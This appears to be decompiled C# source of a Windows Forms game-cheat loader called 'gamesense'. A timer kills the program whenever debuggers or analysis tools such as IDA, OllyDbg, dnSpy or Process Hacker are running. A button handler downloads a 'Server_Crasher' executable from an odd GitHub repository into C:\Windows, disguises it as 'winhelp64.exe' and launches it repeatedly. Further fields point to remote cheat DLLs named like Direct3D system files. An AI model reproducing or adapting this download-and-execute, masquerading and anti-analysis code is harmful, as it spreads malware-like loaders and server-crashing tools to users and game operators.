using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace gamesense
{
	// Token: 0x02000008 RID: 8
	public partial class Form3 : Form
	{
		// Token: 0x06000033 RID: 51
		[DllImport("user32.dll")]
		public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

		// Token: 0x06000034 RID: 52
		[DllImport("user32.dll")]
		public static extern bool ReleaseCapture();

		// Token: 0x06000035 RID: 53 RVA: 0x001AC6D8 File Offset: 0x001A62D8
		public Form3()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000036 RID: 54 RVA: 0x001AA188 File Offset: 0x001A3D88
		private void Form2_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000037 RID: 55 RVA: 0x001AC77C File Offset: 0x001A637C
		private void timer1_Tick(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("ida64");
			Process[] processesByName2 = Process.GetProcessesByName("ida32");
			Process[] processesByName3 = Process.GetProcessesByName("ollydbg");
			Process[] processesByName4 = Process.GetProcessesByName("ollydbg64");
			Process[] processesByName5 = Process.GetProcessesByName("loaddll");
			Process[] processesByName6 = Process.GetProcessesByName("httpdebugger");
			Process[] processesByName7 = Process.GetProcessesByName("windowrenamer");
			Process[] processesByName8 = Process.GetProcessesByName("processhacker");
			Process[] processesByName9 = Process.GetProcessesByName("Process Hacker");
			Process[] processesByName10 = Process.GetProcessesByName("ProcessHacker");
			Process[] processesByName11 = Process.GetProcessesByName("HxD");
			Process[] processesByName12 = Process.GetProcessesByName("parsecd");
			Process[] processesByName13 = Process.GetProcessesByName("ida");
			Process[] processesByName14 = Process.GetProcessesByName("dnSpy");
			if (processesByName.Length != 0 || processesByName2.Length != 0 || processesByName3.Length != 0 || processesByName4.Length != 0 || processesByName5.Length != 0 || processesByName6.Length != 0 || processesByName7.Length != 0 || processesByName8.Length != 0 || processesByName9.Length != 0 || processesByName10.Length != 0 || processesByName11.Length != 0 || processesByName13.Length != 0 || processesByName12.Length != 0 || processesByName14.Length != 0)
			{
				Application.Exit();
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x001AA18A File Offset: 0x001A3D8A
		private void button1_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/zce8mgwWPc");
		}

		// Token: 0x06000039 RID: 57 RVA: 0x001AA197 File Offset: 0x001A3D97
		private void button2_Click(object sender, EventArgs e)
		{
			Process.Start("https://www.youtube.com/channel/UCAR3YZ9Dnxn37uEbjod_QuA");
		}

		// Token: 0x0600003A RID: 58 RVA: 0x001AC8AC File Offset: 0x001A64AC
		private void button5_Click(object sender, EventArgs e)
		{
			Form3.<button5_Click>d__18 <button5_Click>d__;
			<button5_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<button5_Click>d__.<>4__this = this;
			<button5_Click>d__.<>1__state = -1;
			<button5_Click>d__.<>t__builder.Start<Form3.<button5_Click>d__18>(ref <button5_Click>d__);
		}

		// Token: 0x0600003B RID: 59 RVA: 0x001AC8F4 File Offset: 0x001A64F4
		private void button3_Click(object sender, EventArgs e)
		{
			WebClient webClient = new WebClient();
			string text = "C:\\Windows\\" + this.exe_name + ".exe";
			webClient.DownloadFile(this.exe_link, text);
			Task.Delay(10000);
			Process.Start("winhelp64.exe");
			Process.Start("winhelp64.exe");
			Process.Start("winhelp64.exe");
			Process.Start("winhelp64.exe");
			Process.Start("winhelp64.exe");
			if (this.bypass_array.Length != 0 && File.Exists(text))
			{
				File.Delete(text);
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x001AC998 File Offset: 0x001A6598
		private void button6_Click(object sender, EventArgs e)
		{
			Form3.<button6_Click>d__20 <button6_Click>d__;
			<button6_Click>d__.<>t__builder = AsyncVoidMethodBuilder.Create();
			<button6_Click>d__.<>4__this = this;
			<button6_Click>d__.<>1__state = -1;
			<button6_Click>d__.<>t__builder.Start<Form3.<button6_Click>d__20>(ref <button6_Click>d__);
		}

		// Token: 0x0600003D RID: 61 RVA: 0x001AA1A4 File Offset: 0x001A3DA4
		private void Form2_MouseMove(object sender, MouseEventArgs e)
		{
			if (e.Button == MouseButtons.Left)
			{
				Form3.ReleaseCapture();
				Form3.SendMessage(base.Handle, 161, 2, 0);
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x001AA1DA File Offset: 0x001A3DDA
		private void button4_Click_1(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x0600003F RID: 63 RVA: 0x001AA188 File Offset: 0x001A3D88
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000040 RID: 64 RVA: 0x001AA188 File Offset: 0x001A3D88
		private void label4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000041 RID: 65 RVA: 0x001AA188 File Offset: 0x001A3D88
		private void label3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x04000017 RID: 23
		private string dll_link_v1 = "https://github.com/tutheuyuadsucuiwhasdt5r/dwjntnqhsidwufrugw/raw/main/release.dll";

		// Token: 0x04000018 RID: 24
		private string dll_name_v1 = "d3d22";

		// Token: 0x04000019 RID: 25
		private string dll_link_v2 = "https://github.com/tutheuyuadsucuiwhasdt5r/dwjntnqhsidwufrugw/raw/main/cheat.dll";

		// Token: 0x0400001A RID: 26
		private string dll_name_v2 = "d3d23";

		// Token: 0x0400001B RID: 27
		private string exe_name = "winhelp64";

		// Token: 0x0400001C RID: 28
		private string exe_link = "https://github.com/tutheuyuadsucuiwhasdt5r/dwjntnqhsidwufrugw/raw/main/Server_Crasher_community_servers.exe";

		// Token: 0x0400001D RID: 29
		private Process[] bypass_array = Process.GetProcessesByName("winhelp64");

		// Token: 0x0400001E RID: 30
		private int time_to_wait = 35000;

		// Token: 0x0400001F RID: 31
		private bool setted_up = true;

		// Token: 0x04000020 RID: 32
		public const int WM_NCLBUTTONDOWN = 161;

		// Token: 0x04000021 RID: 33
		public const int HT_CAPTION = 2;
	}
}
